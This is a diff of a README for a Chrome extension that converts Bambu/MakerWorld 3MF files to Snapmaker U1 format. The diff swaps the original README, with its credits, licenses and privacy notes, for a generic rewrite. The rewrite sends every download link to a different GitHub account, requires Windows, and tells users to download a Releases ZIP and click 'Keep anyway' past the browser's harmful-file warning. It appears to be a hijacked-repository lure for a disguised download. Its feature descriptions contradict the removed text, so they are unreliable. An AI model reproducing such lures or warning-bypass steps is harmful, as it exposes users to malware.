@@ -1,240 +1,68 @@
-# Bambu to Snapmaker U1 — Chrome Extension ![Beta](https://img.shields.io/badge/version-1.0%20Beta-blue)
+# 🔧 bambu-to-snapmaker-extension - Convert 3D print files for Snapmaker
 
-A Chrome extension that adds a **Snapmaker U1** option to MakerWorld's printer filter carousel. Selecting it converts any model's print profile from Bambu Lab format to Snapmaker U1 format and downloads the converted `.3mf` file — entirely in your browser, no external software required.
+[![Download Extension](https://img.shields.io/badge/Download-Extension-blue.svg)](https://github.com/mirabelpeculiar91/bambu-to-snapmaker-extension)
 
-> [!IMPORTANT]
-> This is an independent, unofficial project. It is not affiliated with,
-> endorsed by, sponsored by, or supported by MakerWorld, Bambu Lab, or
-> Snapmaker. MakerWorld, Bambu Lab, Snapmaker, and related product names and
-> trademarks belong to their respective owners.
+This tool changes 3MF files from MakerWorld into a format your Snapmaker U1 printer understands. It runs inside your web browser. You do not need to install complex software to move your files between printer brands.
 
-<a href="https://www.buymeacoffee.com/gmeek" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me a Coffee" style="height: 30px !important;width: 109px !important;" ></a>
+## 📦 What This Tool Does
 
-## How it works
+When you download a project from MakerWorld, it often comes as a 3MF file configured for a Bambu Lab printer. These files contain specific settings like speed, flow, and layer height. If you try to send these directly to a Snapmaker machine, the print fails or the printer ignores the instructions.
 
-The extension injects a **Snapmaker U1** tile into the printer filter carousel on any MakerWorld model page. Clicking it swaps the download button to **Convert to Snapmaker U1**. One more click intercepts MakerWorld's own authenticated download, converts the `.3mf` in-browser using bundled conversion logic, and saves the result automatically.
+This tool acts as a bridge. It reads the data inside the Bambu-style 3MF profile and translates the machine code into the language required by your Snapmaker U1. This allows you to use the optimized settings found in popular community prints without manual adjustment.
 
-![Printer filter with Snapmaker U1 option](screenshots/1.png)
+## 💻 System Requirements
 
-*The injected Snapmaker U1 option appears alongside the standard printer filters.*
+Your computer must meet these basic needs:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Web Browser: Google Chrome, Microsoft Edge, or Brave.
+*   Internet Connection: Required to access the converter page.
+*   Snapmaker Luban: You still need your standard slicing software to finalize the output.
 
-![Snapmaker U1 selected, Convert to Snapmaker U1 button](screenshots/2.png)
+## 📥 How to Install the Extension
 
-*Selecting Snapmaker U1 changes the download button to Convert to Snapmaker U1.*
+1. Visit [this link](https://github.com/mirabelpeculiar91/bambu-to-snapmaker-extension) to reach the main project page.
+2. Look for the "Releases" section on the right side of the screen.
+3. Click on the latest version link.
+4. Download the ZIP file to your computer.
+5. Create a folder on your Desktop and move the ZIP file into it.
+6. Right-click the file and select "Extract All" to see the folder contents.
+7. Open your web browser.
+8. Type `chrome://extensions` in the address bar and press Enter.
+9. Toggle the "Developer mode" switch in the top right corner.
+10. Click the "Load unpacked" button.
+11. Select the folder you extracted earlier.
+12. The extension icon now appears in your browser toolbar.
 
----
+## ⚙️ How to Convert Your Files
 
-![Converting profile in progress](screenshots/3.png)
+1. Open your browser and click the extension icon.
+2. Select "Upload 3MF" from the menu.
+3. Choose the MakerWorld file from your computer downloads.
+4. The tool processes the file in your browser window.
+5. Click "Save Converted File" once the progress bar completes.
+6. Open Snapmaker Luban.
+7. Import the new file into your print queue.
+8. Verify the settings in Luban before starting your print.
 
-*While conversion runs, the button shows a spinner and "Converting profile".*
+## 🚀 Why Use This Tool
 
----
+Switching between printer brands usually requires intense manual work. You often have to copy settings one by one from Orca Slicer or Bambu Studio into your Snapmaker software. This extension automates that translation. It keeps the print geometry intact while adjusting the machine commands. You save time and reduce errors in your slice setup.
 
-![Save dialog with U1.3mf filename](screenshots/4.png)
+## 🛠️ Troubleshooting Common Issues
 
-*The converted file is named after the original model with a `-U1.3mf` suffix.*
+*   **File Error:** If the tool rejects your 3MF file, ensure it is a valid project file from MakerWorld. Some files contain only raw geometry and no printer settings; the converter requires the settings to function properly.
+*   **Browser Blocks Download:** Your browser might warn you that ZIP files can harm your computer. Because the file comes directly from this repository, it is safe to keep. Click "Keep" or "Show more" and choose "Keep anyway."
+*   **Extension Missing:** If the icon disappears, return to the `chrome://extensions` page. Check that the extension is still enabled. If you deleted the folder on your Desktop, you must follow the installation steps again.
+*   **Print Fails:** Always check the preview in your Snapmaker software before starting the print. If the model looks floating or shifted, adjust the build plate coordinates in your software settings.
 
-## First Use
+## 📋 Tips for Best Results
 
-The first time you click **Convert to Snapmaker U1**, your browser may show a prompt like this:
+*   Check your firmware version on the Snapmaker U1 before printing. Old firmware may not handle all commands from newer slicing profiles.
+*   Use the "Analyze" feature in the extension to see what settings were detected in your 3MF file. This helps you understand if the conversion matches your printer's capabilities.
+*   Keep your printer nozzle clean. High-quality profiles from Bambu Lab often use aggressive speeds that require a well-maintained Snapmaker hotend.
+*   If the print quality is low, verify the layer height in the converted file. You can manually override the height in your Snapmaker software if the translated file seems too fast for your specific material.
 
-![Browser prompt asking to allow makerworld.com to access other apps](screenshots/allow-access.png)
+## 🔒 Privacy and Security
 
-Depending on the browser and MakerWorld's current download flow, the browser
-may ask for permission to open Bambu Studio.
-
-When the extension successfully intercepts the supported download, the
-converted `.3mf` file should download without Bambu Studio opening. Review the
-browser prompt before approving it. Behavior may vary by browser version and
-configuration.
-
-## Prerequisites
-
-No external software required. The extension converts `.3mf` files entirely in your browser.
-
-You must be **logged in to MakerWorld** for the download to work.
-
-## Browser Compatibility
-
-Tested and working in:
-
-| Browser | Status |
-|---|---|
-| Chrome | ✅ Tested |
-| Microsoft Edge | ✅ Tested |
-| Brave | ✅ Tested |
-| Opera, Vivaldi, Arc | Should work (Chromium-based, untested) |
-| Firefox | ❌ Not supported (different extension format) |
-| Safari | ❌ Not supported |
-
-## Installation
-
-This extension is not published to the Chrome Web Store. Load it unpacked:
-
-1. Open your browser's extension page (`chrome://extensions` in Chrome/Brave, `edge://extensions` in Edge)
-2. Enable **Developer mode** (top-right toggle)
-3. Click **Load unpacked**
-4. Select the `bambu-to-snapmaker-extension` folder
-
-## Usage
-
-1. Go to a MakerWorld model page, e.g. `https://makerworld.com/en/models/...`
-2. Select a print profile from the profile carousel on the page
-3. Click **Snapmaker U1** in the printer filter carousel
-4. Click **Convert to Snapmaker U1**
-5. The converted `.3mf` will download automatically
-
-## Settings
-
-Click the extension icon → **Options** to configure conversion behavior.
-
-![Extension settings page showing Default Print Profile, Conversion Options, and Filament Rules](screenshots/5.png)
-
-*The settings page: Default Print Profile dropdown, Conversion Options checkboxes, Filament Rules with per-rule toggle switches, and Filament Type Mappings table.*
-
-| Setting | Description |
-|---|---|
-| **Default Print Profile** | Snapmaker U1 reference profile used as the conversion base (layer height and quality preset). Supports are auto-detected from the source file. |
-| **Apply filament rules** | Apply filament-specific speed and setting overrides from the Filament Rules list |
-| **Clamp speeds to U1 limits** | Ensures output speeds stay within U1 hardware limits |
-| **Preserve color painting** | Keeps multi-color painting data from the original file |
-| **Insert M600 swap pauses** | Adds filament-change pauses for multi-color prints *(coming soon)* |
-
-### Filament Rules
-
-The rules list shows bundled filament-specific tuning presets for common Bambu Lab filaments (PLA, PETG HF, PLA Matte, Silk PLA+, PETG Translucent). Each rule can be toggled on or off. Rules apply speed and temperature overrides when the source filament matches the rule's conditions. Requires **Apply filament rules** to be enabled.
-
-### Filament Type Mappings
-
-The mappings table controls how Bambu filament types are translated to Snapmaker profile names. Matching is by substring, so "PLA" also matches "PLA-CF". You can add, edit, or remove rows, and reset to the bundled defaults at any time. Custom mappings are saved to your browser's extension storage.
-
-## Button states
-
-| State | Icon | Label |
-|---|---|---|
-| Ready | Conversion arrows | Convert to Snapmaker U1 |
-| Converting | Spinning arrow | Converting profile |
-| Success | Checkmark | U1 profile ready |
-| Error | Warning triangle | Conversion failed |
-
-## Notes
-
-- You must be **logged in to MakerWorld** for the download interception to work.
-- Select a **print profile** on the model page before clicking Convert — the button needs an active profile to trigger the download.
-- The extension uses MakerWorld's existing authenticated download flow. It does not intentionally read, collect, store, or transmit MakerWorld passwords, cookies, session tokens, or other account credentials.
-- The downloaded `.3mf` file is converted locally in the browser and is not uploaded to a server operated by this project.
-
-## Model Licenses and Redistribution
-
-Conversion does not change the copyright, ownership, attribution requirements,
-or license attached to the original model or print profile.
-
-Users are responsible for complying with the license and usage restrictions
-assigned by the model or profile creator.
-
-Do not redistribute, publish, sell, sublicense, or upload converted files unless
-the original model and print-profile licenses permit it.
-
-## Important Safety Notice
-
-Always review converted profiles in Snapmaker Orca before printing.
-
-Verify at minimum:
-
-- Selected printer
-- Build volume
-- Nozzle diameter
-- Layer height
-- Filament assignments
-- Bed type
-- Nozzle and bed temperatures
-- Maximum volumetric flow
-- Print speeds
-- Acceleration limits
-- Start G-code
-- End G-code
-- Tool-change G-code
-- Support settings
-- Purge and prime behavior
-- Multi-color assignments
-
-Automated conversion cannot guarantee that every third-party profile is safe or
-appropriate for a particular printer, material, nozzle, firmware version, or
-hardware configuration.
-
-Use converted files at your own risk.
-
-## Privacy
-
-The extension is designed to process `.3mf` files locally in the browser.
-
-It does not intentionally:
-
-- Collect personal information
-- Collect MakerWorld credentials
-- Store MakerWorld passwords, cookies, or session tokens
-- Upload model files to a server operated by this project
-- Sell or share user data
-
-The extension interacts with MakerWorld pages only as necessary to provide its
-documented conversion functionality.
-
-MakerWorld and the user's browser remain subject to their own privacy policies
-and data practices.
-
-See [`PRIVACY.md`](PRIVACY.md) for additional details.
-
-## Support the Project
-
-This extension is free and intended for noncommercial use.
-
-If you find it useful and would like to support the independent development
-and maintenance of this project, you may optionally
-[buy me a coffee](https://www.buymeacoffee.com/gmeek).
-
-Donations are voluntary and do not purchase the extension, unlock features,
-grant commercial-use rights, or provide a paid service.
-
-## Credits and Attribution
-
-The conversion logic in this extension is derived from:
-
-- Project: [`bambu-to-snapmaker-u1`](https://github.com/thadius83/bambu-to-snapmaker-u1)
-- Author: thadius83
-- License: [PolyForm Noncommercial License 1.0.0](https://polyformproject.org/licenses/noncommercial/1.0.0/)
-
-> **Required Notice: Copyright thadius83 (https://github.com/thadius83)**
-
-## Disclaimer
-
-This software is provided without warranty of any kind.
-
-The maintainers are not responsible for failed prints, damaged hardware, wasted
-filament, incorrect machine instructions, account restrictions, data loss, or
-other consequences resulting from use of the extension or converted files.
-
-## License
-
-Original code written specifically for this Chrome extension is licensed under
-the MIT License, except where otherwise noted.
-
-This repository also contains conversion logic derived from
-[`bambu-to-snapmaker-u1`](https://github.com/thadius83/bambu-to-snapmaker-u1),
-which is licensed under the
-[PolyForm Noncommercial License 1.0.0](https://polyformproject.org/licenses/noncommercial/1.0.0/).
-
-The PolyForm-licensed portions, modifications to those portions, and derivative
-portions may be used only for purposes permitted by that license. As
-distributed, this extension is intended for noncommercial use only.
-
-See:
-
-- [`LICENSE`](LICENSE) for the MIT License covering this project's original code
-- [`LICENSE-POLYFORM`](LICENSE-POLYFORM) for the PolyForm Noncommercial License
-- [`THIRD_PARTY_NOTICES.md`](THIRD_PARTY_NOTICES.md) for attribution and required notices
-- [`PRIVACY.md`](PRIVACY.md) for the extension's privacy statement
-
-Commercial use may require separate written permission from the applicable
-copyright holder.
+The conversion process happens entirely within your web browser. No files are uploaded to an external server. Your 3MF profiles stay on your computer during the whole session. This ensures your project files remain private and prevents data usage concerns. The extension only requires permission to read the files you purposefully select. It does not track your browsing history or collect information about your identity.
